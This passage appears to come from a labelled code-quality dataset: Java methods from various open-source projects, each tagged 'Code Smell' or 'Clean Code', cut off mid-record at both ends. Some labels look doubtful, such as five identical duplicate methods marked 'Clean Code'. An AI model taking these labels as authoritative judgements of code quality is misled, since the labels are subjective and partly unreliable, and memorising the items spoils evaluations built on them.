  version.setMainClass(versionJson.get(""mainClass"").getAsString());
  version.setReleaseTime(context.deserialize(versionJson.get(""releaseTime""),Date.class));
  version.setTime(context.deserialize(versionJson.get(""time""),Date.class));
  version.setType(context.deserialize(versionJson.get(""type""),ReleaseType.class));
  List<String> gameArguments=new ArrayList<>();
  List<String> jvmArguments=new ArrayList<>();
  int minimumLauncherVersion=versionJson.get(""minimumLauncherVersion"").getAsInt();
  if (minimumLauncherVersion < 21) {
    gameArguments.addAll(Arrays.asList(versionJson.get(""minecraftArguments"").getAsString().split("" "")));
    gameArguments.add(""--width"");
    gameArguments.add(""${resolution_width}"");
    gameArguments.add(""--height"");
    gameArguments.add(""${resolution_height}"");
    jvmArguments.add(""-Djava.library.path=${natives_directory}"");
    jvmArguments.add(""-Dminecraft.launcher.brand=${launcher_name}"");
    jvmArguments.add(""-Dminecraft.launcher.version=${launcher_version}"");
    jvmArguments.add(""-Dminecraft.client.jar=${primary_jar}"");
    jvmArguments.add(""-cp"");
    jvmArguments.add(""${classpath}"");
  }
 else {
    JsonObject argumentsJson=versionJson.get(""arguments"").getAsJsonObject();
    for (    JsonElement gameArgument : argumentsJson.get(""game"").getAsJsonArray()) {
      if (gameArgument.isJsonPrimitive()) {
        gameArguments.add(gameArgument.getAsString());
      }
 else {
        JsonObject optionalGameArgument=gameArgument.getAsJsonObject();
        JsonArray optionalGameArgumentRules=optionalGameArgument.get(""rules"").getAsJsonArray();
        JsonObject features=optionalGameArgumentRules.get(0).getAsJsonObject().get(""features"").getAsJsonObject();
        if (features.has(""has_custom_resolution"") && features.get(""has_custom_resolution"").getAsBoolean()) {
          for (          JsonElement value : optionalGameArgument.get(""value"").getAsJsonArray()) {
            gameArguments.add(value.getAsString());
          }
        }
      }
    }
    for (    JsonElement jvmArgument : argumentsJson.get(""jvm"").getAsJsonArray()) {
      if (jvmArgument.isJsonPrimitive()) {
        jvmArguments.add(jvmArgument.getAsString());
      }
 else {
      }
    }
  }
  version.setGameArguments(gameArguments.toArray(new String[0]));
  version.setJvmArguments(jvmArguments.toArray(new String[0]));
  return version;
}",1,Code Smell
"private ComponentPackageDOExample buildExample(ComponentPackageQueryCondition condition){
  ComponentPackageDOExample example=new ComponentPackageDOExample();
  ComponentPackageDOExample.Criteria criteria=example.createCriteria();
  if (Objects.nonNull(condition.getId())) {
    criteria.andIdEqualTo(condition.getId());
  }
  if (CollectionUtils.isNotEmpty(condition.getIdList())) {
    criteria.andIdIn(condition.getIdList());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (StringUtils.isNotBlank(condition.getComponentType())) {
    criteria.andComponentTypeEqualTo(condition.getComponentType());
  }
  if (StringUtils.isNotBlank(condition.getComponentName())) {
    criteria.andComponentNameEqualTo(condition.getComponentName());
  }
  if (StringUtils.isNotBlank(condition.getPackageCreator())) {
    criteria.andPackageCreatorEqualTo(condition.getPackageCreator());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersion())) {
    criteria.andPackageVersionEqualTo(condition.getPackageVersion());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  return example;
}
",0,Clean Code
"@Override protected String toEL(Integer depth,StringBuilder paramContext){
  checkMaxWaitSeconds();
  Integer sonDepth=depth == null ? null : depth + 1;
  StringBuilder sb=new StringBuilder();
  processWrapperTabs(sb,depth);
  sb.append(""WHEN("");
  processWrapperNewLine(sb,depth);
  for (int i=0; i < this.getElWrapperList().size(); i++) {
    if (i > 0) {
      sb.append("","");
      processWrapperNewLine(sb,depth);
    }
    sb.append(this.getElWrapperList().get(i).toEL(sonDepth,paramContext));
  }
  processWrapperNewLine(sb,depth);
  processWrapperTabs(sb,depth);
  sb.append("")"");
  if (this.any) {
    sb.append("".any(true)"");
  }
  if (this.ignoreError) {
    sb.append("".ignoreError(true)"");
  }
  if (StrUtil.isNotBlank(customThreadExecutor)) {
    sb.append(StrUtil.format("".threadPool(\""{}\"")"",customThreadExecutor));
  }
  if (CollectionUtil.isNotEmpty(mustExecuteList)) {
    if (this.any) {
      throw new IllegalArgumentException(""'.must()' and '.any()' can use in when component at the same time!"");
    }
    sb.append("".must("");
    for (int i=0; i < mustExecuteList.size(); i++) {
      if (i > 0) {
        sb.append("", "");
      }
      sb.append(StrUtil.format(""\""{}\"""",mustExecuteList.get(i)));
    }
    sb.append("")"");
  }
  processWrapperProperty(sb,paramContext);
  return sb.toString();
}",0,Clean Code
"/** 
 * @param serviceMetaDO
 * @param bindingResult
 * @return
 */
@PostMapping(""update"") @ResponseBody public TeslaBaseResult update(@Valid @RequestBody ServiceMetaDO serviceMetaDO,BindingResult bindingResult){
  if (bindingResult.hasErrors()) {
    return buildValidationResult(bindingResult);
  }
  ServiceMetaDO old=serviceMetaService.selectOne(serviceMetaDO.getServiceCode());
  if (null == old) {
    return buildExceptionResult(new Exception(""Cannot find serviceMetaDO, Please change service code.""));
  }
  int ret=serviceMetaService.update(serviceMetaDO);
  return buildSucceedResult(ret);
}
",0,Clean Code
"/** 
 * Does nothing with its argument. Returns whether it is ensured that the call produces a single value
 * @param call      the expression to evaluate
 * @return Whether it is ensured that the call produces a single value
 */
public static boolean isSingleValue(SqlCall call){
  if (call.getOperator() instanceof SqlAggFunction) {
    return true;
  }
 else   if (call.getOperator() instanceof SqlValuesOperator || call.getOperator() instanceof SqlRowOperator) {
    List<SqlNode> operands=call.getOperandList();
    if (operands.size() == 1) {
      SqlNode operand=operands.get(0);
      if (operand instanceof SqlLiteral) {
        return true;
      }
 else       if (operand instanceof SqlCall) {
        return isSingleValue((SqlCall)operand);
      }
    }
    return false;
  }
 else {
    boolean isScalar=true;
    for (    SqlNode operand : call.getOperandList()) {
      if (operand instanceof SqlLiteral) {
        continue;
      }
      if (!(operand instanceof SqlCall) || !Util.isSingleValue((SqlCall)operand)) {
        isScalar=false;
        break;
      }
    }
    return isScalar;
  }
}",1,Code Smell
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"public AppException(){
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=null;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode){
  this.errorCode=errorCode;
  this.errorMessage=errorCode.getDescription();
  this.errorData=null;
}
public AppException(String errorMessage){
  super(errorMessage);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(Throwable cause){
  super(cause);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=cause.toString();
  this.errorData=ExceptionUtils.getStackFrames(cause);
}
public AppException(String errorMessage,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=errorMessage;
  this.errorData=ExceptionUtils.getStackFrames(cause);
}
public AppException(AppErrorCode errorCode,String errorMessage,Object errorData){
  super(errorMessage);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=errorData;
}
public AppException(AppErrorCode errorCode,String errorMessage){
  super(errorMessage);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode,String errorMessage,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode,String errorMessage,Object errorData,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=errorData;
}
",0,Clean Code
"private void onStickerSetClicked(View view,TLRPC.TL_messages_stickerSet stickerSet,boolean remote){
  TLRPC.InputStickerSet inputStickerSet=null;
  if (remote) {
    TLRPC.TL_inputStickerSetShortName inputStickerSetShortName=new TLRPC.TL_inputStickerSetShortName();
    inputStickerSetShortName.short_name=stickerSet.set.short_name;
    inputStickerSet=inputStickerSetShortName;
  }
  StickersAlert stickersAlert=new StickersAlert(getParentActivity(),GroupStickersActivity.this,inputStickerSet,!remote ? stickerSet : null,null);
  boolean isSelected=((StickerSetCell)view).isChecked();
  stickersAlert.setCustomButtonDelegate(new StickersAlert.StickersAlertCustomButtonDelegate(){
    @Override public String getCustomButtonTextColorKey(){
      return isSelected ? Theme.key_dialogTextRed : Theme.key_featuredStickers_buttonText;
    }
    @Override public String getCustomButtonRippleColorKey(){
      return !isSelected ? Theme.key_featuredStickers_addButtonPressed : null;
    }
    @Override public String getCustomButtonColorKey(){
      return !isSelected ? Theme.key_featuredStickers_addButton : null;
    }
    @Override public String getCustomButtonText(){
      return LocaleController.getString(isSelected ? R.string.RemoveGroupStickerSet : R.string.SetAsGroupStickerSet);
    }
    @Override public boolean onCustomButtonPressed(){
      int row=layoutManager.findFirstVisibleItemPosition();
      int top=Integer.MAX_VALUE;
      RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(row);
      if (holder != null) {
        top=holder.itemView.getTop();
      }
      int prevIndex=selectedStickerSetIndex;
      if (isSelected) {
        selectedStickerSet=null;
        removeStickerSet=true;
      }
 else {
        selectedStickerSet=stickerSet;
        removeStickerSet=false;
      }
      updateSelectedStickerSetIndex();
      if (prevIndex != -1) {
        boolean found=false;
        if (!searching) {
          for (int i=0; i < listView.getChildCount(); i++) {
            View ch=listView.getChildAt(i);
            if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + prevIndex) {
              ((StickerSetCell)ch).setChecked(false,true);
              found=true;
              break;
            }
          }
        }
        if (!found) {
          listAdapter.notifyItemChanged(prevIndex);
        }
      }
      if (selectedStickerSetIndex != -1) {
        boolean found=false;
        if (!searching) {
          for (int i=0; i < listView.getChildCount(); i++) {
            View ch=listView.getChildAt(i);
            if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + selectedStickerSetIndex) {
              ((StickerSetCell)ch).setChecked(true,true);
              found=true;
              break;
            }
          }
        }
        if (!found) {
          listAdapter.notifyItemChanged(selectedStickerSetIndex);
        }
      }
      if (top != Integer.MAX_VALUE) {
        layoutManager.scrollToPositionWithOffset(row + 1,top);
      }
      if (searching) {
        searchItem.setSearchFieldText("""",false);
        actionBar.closeSearchField(true);
      }
      return true;
    }
  }
);
  stickersAlert.show();
}",1,Code Smell
"@Override public DataResult<Chart> queryExistent(ChartQueryParam param){
  EasyLambdaQueryWrapper<ChartDO> queryWrapper=new EasyLambdaQueryWrapper<>();
  queryWrapper.eq(ChartDO::getDeleted,YesOrNoEnum.NO.getLetter()).eqWhenPresent(ChartDO::getId,param.getId()).eqWhenPresent(ChartDO::getUserId,param.getUserId());
  IPage<ChartDO> page=getMapper().selectPage(new Page<>(1,1),queryWrapper);
  if (CollectionUtils.isEmpty(page.getRecords())) {
    throw new DataNotFoundException();
  }
  Chart data=chartConverter.do2model(page.getRecords().get(0));
  setDataSourceInfo(Lists.newArrayList(data));
  return DataResult.of(data);
}
@Override public DataResult<Chart> queryExistent(Long id){
  DataResult<Chart> dataResult=find(id);
  if (dataResult.getData() == null) {
    throw new DataNotFoundException();
  }
  return dataResult;
}",0,Clean Code
"/** 
 * 鍐欏缓琛ㄨ鍙ャ��
 * @param dataExchange
 * @param cn
 * @param columns
 * @param rs
 * @param quote
 * @param out
 * @param exportContext
 * @throws Throwable
 */
protected void writeCreationSql(SqlDataExport dataExchange,Connection cn,List<Column> columns,ResultSet rs,String quote,Writer out,IndexFormatDataExchangeContext exportContext) throws Throwable {
  out.write(""CREATE TABLE "");
  out.write(JdbcUtil.quoteIfNon(dataExchange.getTableName(),quote));
  out.write(LINE_SEPARATOR);
  out.write('(');
  out.write(LINE_SEPARATOR);
  PrimaryKey primaryKey=getDbMetaResolver().getPrimaryKey(cn,dataExchange.getTableName());
  List<String> filterPkNames=filterPrimaryColumnNames(primaryKey,columns);
  for (int i=0, len=columns.size(); i < len; i++) {
    Column column=columns.get(i);
    out.write(""  "");
    out.write(JdbcUtil.quote(column.getName(),quote));
    out.write(' ');
    out.write(column.getTypeName());
    if (column.getSize() > 0) {
      out.write('(');
      out.write(Integer.toString(column.getSize()));
      if (column.getDecimalDigits() > 0) {
        out.write(',');
        out.write(Integer.toString(column.getDecimalDigits()));
      }
      out.write(')');
    }
    if (!column.isNullable())     out.write("" NOT NULL"");
    if (i < len - 1)     out.write(',');
 else     if (i == len - 1 && !filterPkNames.isEmpty())     out.write(',');
    out.write(LINE_SEPARATOR);
  }
  if (!filterPkNames.isEmpty()) {
    out.write(""  "");
    out.write(""PRIMARY KEY ("");
    for (int i=0, len=filterPkNames.size(); i < len; i++) {
      out.write(JdbcUtil.quote(filterPkNames.get(i),quote));
      if (i < len - 1)       out.write(',');
    }
    out.write("")"");
    out.write(LINE_SEPARATOR);
  }
  out.write("");"");
  out.write(LINE_SEPARATOR);
  out.write(LINE_SEPARATOR);
}",1,Code Smell
"public static int getDetectedVersion(){
  EGL10 egl=(EGL10)EGLContext.getEGL();
  EGLDisplay display=egl.eglGetDisplay(EGL10.EGL_DEFAULT_DISPLAY);
  int[] numConfigs=new int[1];
  if (egl.eglInitialize(display,null)) {
    try {
      boolean checkES3=hasExtension(egl.eglQueryString(display,EGL10.EGL_EXTENSIONS),""EGL_KHR_create_context"");
      if (egl.eglGetConfigs(display,null,0,numConfigs)) {
        EGLConfig[] configs=new EGLConfig[numConfigs[0]];
        if (egl.eglGetConfigs(display,configs,numConfigs[0],numConfigs)) {
          int highestEsVersion=0;
          int[] value=new int[1];
          for (int i=0; i < numConfigs[0]; i++) {
            if (egl.eglGetConfigAttrib(display,configs[i],EGL10.EGL_RENDERABLE_TYPE,value)) {
              if (checkES3 && ((value[0] & EGL_OPENGL_ES3_BIT_KHR) == EGL_OPENGL_ES3_BIT_KHR)) {
                if (highestEsVersion < 3)                 highestEsVersion=3;
              }
 else               if ((value[0] & EGL_OPENGL_ES2_BIT) == EGL_OPENGL_ES2_BIT) {
                if (highestEsVersion < 2)                 highestEsVersion=2;
              }
 else               if ((value[0] & EGL_OPENGL_ES_BIT) == EGL_OPENGL_ES_BIT) {
                if (highestEsVersion < 1)                 highestEsVersion=1;
              }
            }
 else {
              Log.w(""glesDetect"",""Getting config attribute with "" + ""EGL10#eglGetConfigAttrib failed "" + ""("" + i + ""/""+ numConfigs[0]+ ""): ""+ egl.eglGetError());
            }
          }
          return highestEsVersion;
        }
 else {
          Log.e(""glesDetect"",""Getting configs with EGL10#eglGetConfigs failed: "" + egl.eglGetError());
          return -1;
        }
      }
 else {
        Log.e(""glesDetect"",""Getting number of configs with EGL10#eglGetConfigs failed: "" + egl.eglGetError());
        return -2;
      }
    }
  finally {
      egl.eglTerminate(display);
    }
  }
 else {
    Log.e(""glesDetect"",""Couldn't initialize EGL."");
    return -3;
  }
}",1,Code Smell
"public static int compareBsonValue(BsonValue o1,BsonValue o2){
  return compareBsonValue(o1,o2,true);
}
private static int compareBsonValue(BsonValue o1,BsonValue o2,boolean isTopLevel){
  if (isTopLevel) {
    BsonValue element1=o1;
    BsonValue element2=o2;
    if (isArray(o1)) {
      element1=smallestValueOfArray(o1.asArray());
    }
    if (isArray(o2)) {
      element2=smallestValueOfArray(o2.asArray());
    }
    return compareBsonValue(element1,element2,false);
  }
  if (typeOrder(o1) != typeOrder(o2)) {
    return Integer.compare(typeOrder(o1),typeOrder(o2));
  }
  if (isNull(o1) || isMinKey(o1) || isMaxKey(o1)) {
    return 0;
  }
  if (isBsonNumber(o1)) {
    return toDecimal128(o1).compareTo(toDecimal128(o2));
  }
  if (o1.isString() || o1.isSymbol()) {
    return toJavaString(o1).compareTo(toJavaString(o2));
  }
  if (o1.isDocument() || o1.isDBPointer()) {
    return compareBsonDocument(toBsonDocument(o1),toBsonDocument(o2));
  }
  if (o1.isArray()) {
    return compareBsonArray(o1.asArray(),o2.asArray());
  }
  if (o1.isBinary()) {
    return compareBsonBinary(o1.asBinary(),o2.asBinary());
  }
  if (o1.isObjectId()) {
    return o1.asObjectId().compareTo(o2.asObjectId());
  }
  if (o1.isBoolean()) {
    return o1.asBoolean().compareTo(o2.asBoolean());
  }
  if (o1.isDateTime()) {
    return o1.asDateTime().compareTo(o2.asDateTime());
  }
  if (o1.isTimestamp()) {
    return o1.asTimestamp().compareTo(o2.asTimestamp());
  }
  if (o1.isRegularExpression() || o1.isJavaScript()) {
    return toJavaString(o1).compareTo(toJavaString(o2));
  }
  if (o1.isJavaScriptWithScope()) {
    return compareJavascriptWithScope(o1.asJavaScriptWithScope(),o2.asJavaScriptWithScope());
  }
  throw new IllegalArgumentException(String.format(""Unable to compare bson values between %s and %s"",o1,o2));
}",0,Clean Code
"@Override @SuppressLint(""DiscouragedApi"") protected void after(MethodHookParam param) throws Throwable {
  if (param.args[0] == null)   return;
  Context mContext=((Activity)param.thisObject).getBaseContext();
  int opt=Integer.parseInt(mPrefsMap.getString(""settings_icon"",""0""));
  if (opt == 0)   return;
  Resources modRes=getModuleRes(mContext);
  mPreferenceHeader=findClassIfExists(""com.android.settingslib.miuisettings.preference.PreferenceActivity$Header"");
  if (mPreferenceHeader == null)   return;
  Intent mIntent=new Intent();
  mIntent.putExtra(""isDisplayHomeAsUpEnabled"",true);
  mIntent.setClassName(ProjectApi.mAppModulePkg,MainActivity.class.getCanonicalName());
  Object header=XposedHelpers.newInstance(mPreferenceHeader);
  XposedHelpers.setLongField(header,""id"",666);
  XposedHelpers.setObjectField(header,""intent"",mIntent);
  XposedHelpers.setIntField(header,""iconRes"",settingsIconResId);
  XposedHelpers.setObjectField(header,""title"",modRes.getString(R.string.app_name));
  Bundle bundle=new Bundle();
  ArrayList<UserHandle> users=new ArrayList<>();
  users.add((UserHandle)XposedHelpers.newInstance(UserHandle.class,0));
  bundle.putParcelableArrayList(""header_user"",users);
  XposedHelpers.setObjectField(header,""extras"",bundle);
  int themes=mContext.getResources().getIdentifier(""launcher_settings"",""id"",mContext.getPackageName());
  int special=mContext.getResources().getIdentifier(""other_special_feature_settings"",""id"",mContext.getPackageName());
  int timer=mContext.getResources().getIdentifier(""app_timer"",""id"",mContext.getPackageName());
  List<Object> headers=(List<Object>)param.args[0];
  int position=0;
  for (  Object head : headers) {
    position++;
    long id=XposedHelpers.getLongField(head,""id"");
    if (opt == 1 && id == -1) {
      headers.add(position - 1,header);
    }
 else     if (opt == 2 && id == themes) {
      headers.add(position,header);
    }
 else     if (opt == 3 && id == (Integer.parseInt(Build.getMiuiVersionCode()) < 14 ? special : timer)) {
      headers.add(position,header);
    }
  }
  if (headers.size() > 25) {
    headers.add(25,header);
  }
 else {
    headers.add(header);
  }
}",1,Code Smell
"@Override public void serialize(RowData consumedRow,TypedMessageBuilder<RowData> messageBuilder){
  if (keySerialization == null && !hasMetadata) {
    messageBuilder.value(consumedRow);
    return;
  }
  if (delayMilliseconds > 0) {
    messageBuilder.deliverAfter(delayMilliseconds,TimeUnit.MILLISECONDS);
  }
  if (keySerialization != null) {
    final RowData keyRow=createProjectedRow(consumedRow,RowKind.INSERT,keyFieldGetters);
    messageBuilder.keyBytes(keySerialization.serialize(keyRow));
  }
  final RowKind kind=consumedRow.getRowKind();
  final RowData valueRow=createProjectedRow(consumedRow,kind,valueFieldGetters);
  if (upsertMode) {
    if (kind == RowKind.DELETE || kind == RowKind.UPDATE_BEFORE) {
    }
 else {
      valueRow.setRowKind(RowKind.INSERT);
      messageBuilder.value(valueRow);
    }
  }
 else {
    messageBuilder.value(valueRow);
  }
  Map<String,String> properties=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.PROPERTIES);
  if (properties != null) {
    messageBuilder.properties(properties);
  }
  final Long eventTime=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.EVENT_TIME);
  if (eventTime != null && eventTime >= 0) {
    messageBuilder.eventTime(eventTime);
  }
}",1,Code Smell
"public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotEqualTo(Date value){
  addCriterion(""gmt_modified <>"",value,""gmtModified"");
  return (Criteria)this;
}
",0,Clean Code
"private void startBatchRenaming(List<Path> paths,String prefix,@Nullable String extension){
  AtomicReference<Future<?>> renameThread=new AtomicReference<>();
  View view=View.inflate(requireContext(),R.layout.dialog_progress,null);
  LinearProgressIndicator progress=view.findViewById(R.id.progress_linear);
  TextView label=view.findViewById(android.R.id.text1);
  TextView counter=view.findViewById(android.R.id.text2);
  counter.setText(String.format(Locale.getDefault(),""%d/%d"",0,paths.size()));
  AlertDialog dialog=new MaterialAlertDialogBuilder(requireContext()).setTitle(R.string.rename).setView(view).setPositiveButton(R.string.action_stop_service,(dialog1,which) -> {
    if (renameThread.get() != null) {
      renameThread.get().cancel(true);
    }
  }
).setCancelable(false).show();
  renameThread.set(ThreadUtils.postOnBackgroundThread(() -> {
    WeakReference<LinearProgressIndicator> progressRef=new WeakReference<>(progress);
    WeakReference<TextView> labelRef=new WeakReference<>(label);
    WeakReference<TextView> counterRef=new WeakReference<>(counter);
    WeakReference<AlertDialog> dialogRef=new WeakReference<>(dialog);
    try {
      LinearProgressIndicator p=progressRef.get();
      if (p != null) {
        p.setMax(paths.size());
        p.setProgress(0);
        p.setIndeterminate(false);
      }
      int i=1;
      for (      Path path : paths) {
        TextView l=labelRef.get();
        if (l != null) {
          ThreadUtils.postOnMainThread(() -> l.setText(path.getName()));
        }
        if (ThreadUtils.isInterrupted()) {
          break;
        }
        SystemClock.sleep(2_000);
        if (ThreadUtils.isInterrupted()) {
          break;
        }
        Path basePath=path.getParent();
        if (basePath != null) {
          String displayName=findNextBestDisplayName(basePath,prefix,extension,i);
          path.renameTo(displayName);
        }
        TextView c=counterRef.get();
        int finalI=i;
        ThreadUtils.postOnMainThread(() -> {
          if (c != null) {
            c.setText(String.format(Locale.getDefault(),""%d/%d"",finalI,paths.size()));
          }
          if (p != null) {
            p.setProgress(finalI);
          }
        }
);
        ++i;
        if (ThreadUtils.isInterrupted()) {
          break;
        }
      }
    }
  finally {
      AlertDialog d=dialogRef.get();
      if (d != null) {
        ThreadUtils.postOnMainThread(() -> {
          d.dismiss();
          UIUtils.displayShortToast(R.string.renamed_successfully);
          mModel.reload();
        }
);
      }
    }
  }
));
}",1,Code Smell
"private static List<String> loadAllInstalledModule(Context context){
  PackageManager pm=context.getPackageManager();
  List<String> modulePathList=new ArrayList<>();
  List<String> packageNameList=loadPackageNameListFromFile(true);
  List<Pair<String,String>> installedModuleList=new ArrayList<>();
  boolean configFileExist=configFileExist();
  List<PackageInfo> packageInfoList=pm.getInstalledPackages(PackageManager.GET_META_DATA);
  for (  PackageInfo pkg : packageInfoList) {
    ApplicationInfo app=pkg.applicationInfo;
    if (!app.enabled)     continue;
    if (app.metaData != null && app.metaData.containsKey(""xposedmodule"")) {
      String apkPath=pkg.applicationInfo.publicSourceDir;
      String apkName=context.getPackageManager().getApplicationLabel(pkg.applicationInfo).toString();
      if (TextUtils.isEmpty(apkPath)) {
        apkPath=pkg.applicationInfo.sourceDir;
      }
      if (!TextUtils.isEmpty(apkPath) && (!configFileExist || packageNameList == null || packageNameList.contains(app.packageName))) {
        XLog.d(TAG,"" query installed module path -> "" + apkPath);
        modulePathList.add(apkPath);
      }
      installedModuleList.add(Pair.create(pkg.applicationInfo.packageName,apkName));
    }
  }
  final List<Pair<String,String>> installedModuleListFinal=installedModuleList;
  new Thread(new Runnable(){
    @Override public void run(){
      List<String> savedPackageNameList=loadPackageNameListFromFile(false);
      if (savedPackageNameList == null) {
        savedPackageNameList=new ArrayList<>();
      }
      List<Pair<String,String>> addPackageList=new ArrayList<>();
      for (      Pair<String,String> packgagePair : installedModuleListFinal) {
        if (!savedPackageNameList.contains(packgagePair.first)) {
          XLog.d(TAG,"" addPackageList packgagePair -> "" + packgagePair);
          addPackageList.add(packgagePair);
        }
      }
      appendPackageNameToFile(addPackageList);
    }
  }
).start();
  return modulePathList;
}
",1,Code Smell
"protected boolean computeScrollHelper(){
  if (mScroller.computeScrollOffset()) {
    int oldPos=mOrientationHandler.getPrimaryScroll(this);
    int newPos=mScroller.getCurrX();
    if (oldPos != newPos) {
      mOrientationHandler.setPrimary(this,VIEW_SCROLL_TO,mScroller.getCurrX());
    }
    if (mAllowOverScroll) {
      if (newPos < mMinScroll && oldPos >= mMinScroll) {
        mEdgeGlowLeft.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
 else       if (newPos > mMaxScroll && oldPos <= mMaxScroll) {
        mEdgeGlowRight.onAbsorb((int)mScroller.getCurrVelocity());
        abortScrollerAnimation(false);
        onEdgeAbsorbingScroll();
      }
    }
    int finalPos=mOrientationHandler.getPrimaryValue(mScroller.getFinalX(),mScroller.getFinalY());
    if (newPos == finalPos && mEdgeGlowLeft.isFinished() && mEdgeGlowRight.isFinished()) {
      abortScrollerAnimation(false);
    }
    invalidate();
    return true;
  }
 else   if (mNextPage != INVALID_PAGE) {
    sendScrollAccessibilityEvent();
    int prevPage=mCurrentPage;
    mCurrentPage=validateNewPage(mNextPage);
    mCurrentScrollOverPage=mCurrentPage;
    mNextPage=INVALID_PAGE;
    notifyPageSwitchListener(prevPage);
    if (!mIsBeingDragged) {
      pageEndTransition();
    }
    if (canAnnouncePageDescription()) {
      announcePageForAccessibility();
    }
  }
  return false;
}
",1,Code Smell
"public int getMaxMessageTextWidth(){
  int maxWidth=0;
  if (AndroidUtilities.isTablet() && eventId != 0) {
    generatedWithMinSize=dp(530);
  }
 else {
    generatedWithMinSize=AndroidUtilities.isTablet() ? AndroidUtilities.getMinTabletSide() : getParentWidth();
  }
  generatedWithDensity=AndroidUtilities.density;
  if (hasCode && !isSaved) {
    maxWidth=generatedWithMinSize - dp(45 + 15);
    if (needDrawAvatarInternal() && !isOutOwner() && !messageOwner.isThreadMessage) {
      maxWidth-=dp(52);
    }
  }
 else   if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage && getMedia(messageOwner).webpage != null && ""telegram_background"".equals(getMedia(messageOwner).webpage.type)) {
    try {
      Uri uri=Uri.parse(getMedia(messageOwner).webpage.url);
      String segment=uri.getLastPathSegment();
      if (uri.getQueryParameter(""bg_color"") != null) {
        maxWidth=dp(220);
      }
 else       if (segment.length() == 6 || segment.length() == 13 && segment.charAt(6) == '-') {
        maxWidth=dp(200);
      }
    }
 catch (    Exception ignore) {
    }
  }
 else   if (isAndroidTheme()) {
    maxWidth=dp(200);
  }
  if (maxWidth == 0) {
    maxWidth=generatedWithMinSize - dp(80);
    if (needDrawAvatarInternal() && !isOutOwner() && !messageOwner.isThreadMessage) {
      maxWidth-=dp(52);
    }
    if (needDrawShareButton() && (isSaved || !isOutOwner())) {
      maxWidth-=dp(isSaved && isOutOwner() ? 40 : 10);
    }
    if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaGame) {
      maxWidth-=dp(10);
    }
  }
  if (emojiOnlyCount >= 1 && totalAnimatedEmojiCount <= 100 && (emojiOnlyCount - totalAnimatedEmojiCount) < (SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 100 : 50) && (hasValidReplyMessageObject() || isForwarded())) {
    maxWidth=Math.min(maxWidth,(int)(generatedWithMinSize * .65f));
  }
  return maxWidth;
}",1,Code Smell
"private void electSelf(){
  long oldTerm;
  try {
    LOG.info(""Node {} start vote and grant vote self, term={}."",getNodeId(),this.currTerm);
    if (!this.conf.contains(this.serverId)) {
      LOG.warn(""Node {} can't do electSelf as it is not in {}."",getNodeId(),this.conf);
      return;
    }
    if (this.state == State.STATE_FOLLOWER) {
      LOG.debug(""Node {} stop election timer, term={}."",getNodeId(),this.currTerm);
      this.electionTimer.stop();
    }
    resetLeaderId(PeerId.emptyPeer(),new Status(RaftError.ERAFTTIMEDOUT,""A follower's leader_id is reset to NULL as it begins to request_vote.""));
    this.state=State.STATE_CANDIDATE;
    this.currTerm++;
    this.votedId=this.serverId.copy();
    LOG.debug(""Node {} start vote timer, term={} ."",getNodeId(),this.currTerm);
    this.voteTimer.start();
